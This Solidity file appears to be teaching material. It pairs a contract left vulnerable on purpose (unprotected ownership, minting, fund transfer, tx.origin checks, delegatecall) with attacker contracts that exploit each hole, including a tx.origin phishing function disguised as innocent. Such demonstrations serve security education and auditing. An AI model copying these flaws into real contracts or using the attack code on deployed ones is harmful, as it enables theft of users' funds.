// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title AccessControlVulnerable
 * @dev Demonstrates various access control vulnerabilities
 * 
 * WARNING: This contract is intentionally vulnerable and should NEVER be used in production!
 * 
 * Vulnerabilities demonstrated:
 * 1. Missing access controls on critical functions
 * 2. Weak authentication mechanisms
 * 3. tx.origin vs msg.sender confusion
 * 4. Unprotected initialization
 * 5. Role escalation vulnerabilities
 * 6. Front-running in access control
 * 7. Delegatecall vulnerabilities
 * 8. Unprotected self-destruct
 */
contract AccessControlVulnerable {
    address public owner;
    address public admin;
    mapping(address => bool) public authorized;
    mapping(address => uint256) public balances;
    mapping(address => bool) public isAdmin;
    
    uint256 public totalSupply;
    bool public initialized;
    uint256 public emergencyWithdrawalDelay;
    uint256 public lastEmergencyCall;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event AdminAdded(address indexed admin);
    event AdminRemoved(address indexed admin);
    event EmergencyWithdrawal(address indexed user, uint256 amount);
    event FundsTransferred(address indexed to, uint256 amount);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }
    
    // VULNERABILITY: Weak modifier that can be bypassed
    modifier onlyAuthorized() {
        require(authorized[msg.sender] || msg.sender == owner, "Not authorized");
        _;
    }
    
    // VULNERABILITY: Using tx.origin instead of msg.sender
    modifier onlyOwnerOrigin() {
        require(tx.origin == owner, "Not the owner origin");
        _;
    }
    
    constructor() {
        // VULNERABILITY: No initialization, anyone can call initialize
    }
    
    /**
     * @dev VULNERABILITY: Unprotected initialization function
     */
    function initialize(address _owner) external {
        require(!initialized, "Already initialized");
        owner = _owner;
        admin = _owner;
        initialized = true;
        emergencyWithdrawalDelay = 1 days;
    }
    
    /**
     * @dev VULNERABILITY: Missing access control on critical function
     */
    function setOwner(address newOwner) external {
        address previousOwner = owner;
        owner = newOwner;
        emit OwnershipTransferred(previousOwner, newOwner);
    }
    
    /**
     * @dev VULNERABILITY: Anyone can add themselves as admin
     */
    function addAdmin(address newAdmin) external {
        isAdmin[newAdmin] = true;
        emit AdminAdded(newAdmin);
    }
    
    /**
     * @dev VULNERABILITY: Weak access control using tx.origin
     */
    function transferOwnershipOrigin(address newOwner) external onlyOwnerOrigin {
        owner = newOwner;
        emit OwnershipTransferred(owner, newOwner);
    }
    
    /**
     * @dev VULNERABILITY: Missing access control on fund management
     */
    function mint(address to, uint256 amount) external {
        balances[to] += amount;
        totalSupply += amount;
    }
    
    /**
     * @dev VULNERABILITY: Insufficient access control
     */
    function burn(address from, uint256 amount) external onlyAuthorized {
        require(balances[from] >= amount, "Insufficient balance");
        balances[from] -= amount;
        totalSupply -= amount;
    }
    
    /**
     * @dev VULNERABILITY: Emergency function with weak protection
     */
    function emergencyWithdraw() external {
        require(block.timestamp >= lastEmergencyCall + emergencyWithdrawalDelay, "Too soon");
        
        uint256 amount = address(this).balance;
        lastEmergencyCall = block.timestamp;
        
        payable(msg.sender).transfer(amount);
        emit EmergencyWithdrawal(msg.sender, amount);
    }
    
    /**
     * @dev VULNERABILITY: Unprotected critical parameter change
     */
    function setEmergencyDelay(uint256 newDelay) external {
        emergencyWithdrawalDelay = newDelay;
    }
    
    /**
     * @dev VULNERABILITY: Delegatecall to user-controlled address
     */
    function delegateCall(address target, bytes calldata data) external onlyAuthorized {
        (bool success, ) = target.delegatecall(data);
        require(success, "Delegatecall failed");
    }
    
    /**
     * @dev VULNERABILITY: Unprotected self-destruct
     */
    function destroy() external {
        require(msg.sender == admin, "Only admin can destroy");
        selfdestruct(payable(admin));
    }
    
    /**
     * @dev VULNERABILITY: Race condition in authorization
     */
    function authorize(address user) external {
        require(msg.sender == owner || isAdmin[msg.sender], "Not authorized to authorize");
        authorized[user] = true;
    }
    
    /**
     * @dev VULNERABILITY: Missing access control on deauthorization
     */
    function deauthorize(address user) external {
        authorized[user] = false;
    }
    
    /**
     * @dev VULNERABILITY: Weak admin check
     */
    function adminFunction() external {
        require(isAdmin[msg.sender] || msg.sender == admin, "Not admin");
        // Critical admin functionality here
    }
    
    /**
     * @dev VULNERABILITY: Front-runnable ownership transfer
     */
    function claimOwnership() external {
        require(msg.sender == admin, "Only admin can claim ownership");
        owner = msg.sender;
    }
    
    /**
     * @dev VULNERABILITY: Unprotected fund transfer
     */
    function transferFunds(address to, uint256 amount) external {
        require(address(this).balance >= amount, "Insufficient balance");
        payable(to).transfer(amount);
        emit FundsTransferred(to, amount);
    }
    
    /**
     * @dev VULNERABILITY: Weak role management
     */
    function promoteToAdmin(address user) external {
        require(authorized[user], "User not authorized");
        isAdmin[user] = true;
        emit AdminAdded(user);
    }
    
    /**
     * @dev VULNERABILITY: Missing validation in batch operations
     */
    function batchAuthorize(address[] calldata users) external {
        require(msg.sender == owner, "Only owner");
        
        for (uint256 i = 0; i < users.length; i++) {
            authorized[users[i]] = true;
        }
    }
    
    /**
     * @dev VULNERABILITY: Unprotected configuration change
     */
    function updateConfig(uint256 newDelay, address newAdmin) external {
        emergencyWithdrawalDelay = newDelay;
        admin = newAdmin;
    }
    
    /**
     * @dev VULNERABILITY: Privilege escalation through function call
     */
    function executeAsOwner(address target, bytes calldata data) external {
        require(authorized[msg.sender], "Not authorized");
        
        // This allows authorized users to execute arbitrary calls as the contract
        (bool success, ) = target.call(data);
        require(success, "Call failed");
    }
    
    /**
     * @dev VULNERABILITY: Unprotected state reset
     */
    function reset() external {
        totalSupply = 0;
        lastEmergencyCall = 0;
        // This could be called by anyone to reset critical state
    }
    
    /**
     * @dev VULNERABILITY: Missing access control on critical getter
     */
    function getPrivateData() external view returns (uint256, address, bool) {
        return (emergencyWithdrawalDelay, admin, initialized);
    }
    
    // Getter functions
    function getBalance(address user) external view returns (uint256) {
        return balances[user];
    }
    
    function isAuthorized(address user) external view returns (bool) {
        return authorized[user];
    }
    
    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    receive() external payable {}
}

/**
 * @title AccessControlAttacker
 * @dev Contract to demonstrate access control attacks
 */
contract AccessControlAttacker {
    AccessControlVulnerable public target;
    address public originalOwner;
    
    constructor(address payable _target) {
        target = AccessControlVulnerable(_target);
    }
    
    /**
     * @dev Attack 1: Initialize the contract if not initialized
     */
    function initializeAttack() external {
        if (!target.initialized()) {
            target.initialize(address(this));
        }
    }
    
    /**
     * @dev Attack 2: Take ownership through unprotected function
     */
    function ownershipAttack() external {
        target.setOwner(address(this));
    }
    
    /**
     * @dev Attack 3: Add self as admin
     */
    function adminAttack() external {
        target.addAdmin(address(this));
    }
    
    /**
     * @dev Attack 4: Mint unlimited tokens
     */
    function mintAttack(uint256 amount) external {
        target.mint(address(this), amount);
    }
    
    /**
     * @dev Attack 5: Emergency withdrawal attack
     */
    function emergencyAttack() external {
        target.setEmergencyDelay(0); // Set delay to 0
        target.emergencyWithdraw(); // Withdraw all funds
    }
    
    /**
     * @dev Attack 6: Delegatecall attack
     */
    function delegatecallAttack() external {
        // First become authorized
        target.addAdmin(address(this));
        target.authorize(address(this));
        
        // Prepare malicious delegatecall data
        bytes memory data = abi.encodeWithSignature("setOwner(address)", address(this));
        target.delegateCall(address(this), data);
    }
    
    /**
     * @dev Attack 7: Destroy contract attack
     */
    function destroyAttack() external {
        target.addAdmin(address(this));
        target.destroy();
    }
    
    /**
     * @dev Attack 8: Fund transfer attack
     */
    function fundTransferAttack() external {
        uint256 balance = target.getContractBalance();
        target.transferFunds(address(this), balance);
    }
    
    /**
     * @dev Attack 9: Privilege escalation attack
     */
    function privilegeEscalationAttack() external {
        // Add self as authorized
        target.addAdmin(address(this));
        target.authorize(address(this));
        
        // Use executeAsOwner to call sensitive functions
        bytes memory data = abi.encodeWithSignature("setOwner(address)", address(this));
        target.executeAsOwner(address(target), data);
    }
    
    /**
     * @dev Attack 10: State reset attack
     */
    function resetAttack() external {
        target.reset();
    }
    
    // Function to receive ETH
    receive() external payable {}
    
    // Fallback function for delegatecall attack
    fallback() external payable {
        // This could contain malicious code executed in target's context
    }
}

/**
 * @title TxOriginAttacker
 * @dev Demonstrates tx.origin attack
 */
contract TxOriginAttacker {
    AccessControlVulnerable public target;
    
    constructor(address payable _target) {
        target = AccessControlVulnerable(_target);
    }
    
    /**
     * @dev Phishing attack using tx.origin vulnerability
     */
    function phishingAttack() external {
        // If the owner calls this function, we can transfer ownership
        // because tx.origin will be the owner
        target.transferOwnershipOrigin(address(this));
    }
    
    /**
     * @dev Social engineering function to trick the owner
     */
    function innocentFunction() external {
        // This looks innocent but actually performs the attack
        // If the owner calls this function, we can transfer ownership
        // because tx.origin will be the owner
        target.transferOwnershipOrigin(address(this));
    }
}

/**
 * @title FrontRunningAttacker
 * @dev Demonstrates front-running attacks on access control
 */
contract FrontRunningAttacker {
    AccessControlVulnerable public target;
    
    constructor(address payable _target) {
        target = AccessControlVulnerable(_target);
    }
    
    /**
     * @dev Front-run ownership claim
     */
    function frontRunOwnership() external {
        // Monitor mempool for claimOwnership transactions
        // and front-run with higher gas price
        target.claimOwnership();
    }
    
    /**
     * @dev Front-run authorization
     */
    function frontRunAuthorization(address user) external {
        // Front-run legitimate authorization with deauthorization
        target.deauthorize(user);
    }
}

/**
 * @title AccessControlExploitDemo
 * @dev Demonstrates comprehensive access control exploits
 */
contract AccessControlExploitDemo {
    AccessControlVulnerable public vulnerableContract;
    AccessControlAttacker public attackerContract;
    
    event ExploitResult(string exploitType, bool success, address newOwner);
    
    constructor() {
        vulnerableContract = new AccessControlVulnerable();
        attackerContract = new AccessControlAttacker(payable(address(vulnerableContract)));
    }
    
    /**
     * @dev Demonstrate initialization attack
     */
    function demonstrateInitializationAttack() external {
        try attackerContract.initializeAttack() {
            address newOwner = vulnerableContract.owner();
            emit ExploitResult("Initialization Attack", true, newOwner);
        } catch {
            emit ExploitResult("Initialization Attack", false, address(0));
        }
    }
    
    /**
     * @dev Demonstrate ownership takeover
     */
    function demonstrateOwnershipAttack() external {
        try attackerContract.ownershipAttack() {
            address newOwner = vulnerableContract.owner();
            emit ExploitResult("Ownership Attack", true, newOwner);
        } catch {
            emit ExploitResult("Ownership Attack", false, address(0));
        }
    }
    
    /**
     * @dev Demonstrate admin privilege escalation
     */
    function demonstrateAdminAttack() external {
        try attackerContract.adminAttack() {
            bool isAdmin = vulnerableContract.isAdmin(address(attackerContract));
            emit ExploitResult("Admin Attack", isAdmin, address(attackerContract));
        } catch {
            emit ExploitResult("Admin Attack", false, address(0));
        }
    }
    
    /**
     * @dev Demonstrate unlimited minting
     */
    function demonstrateMintAttack() external {
        uint256 balanceBefore = vulnerableContract.getBalance(address(attackerContract));
        
        try attackerContract.mintAttack(1000000 ether) {
            uint256 balanceAfter = vulnerableContract.getBalance(address(attackerContract));
            bool success = balanceAfter > balanceBefore;
            emit ExploitResult("Mint Attack", success, address(attackerContract));
        } catch {
            emit ExploitResult("Mint Attack", false, address(0));
        }
    }
    
    /**
     * @dev Fund the vulnerable contract for testing
     */
    function fundContract() external payable {
        payable(address(vulnerableContract)).transfer(msg.value);
    }
    
    receive() external payable {}
}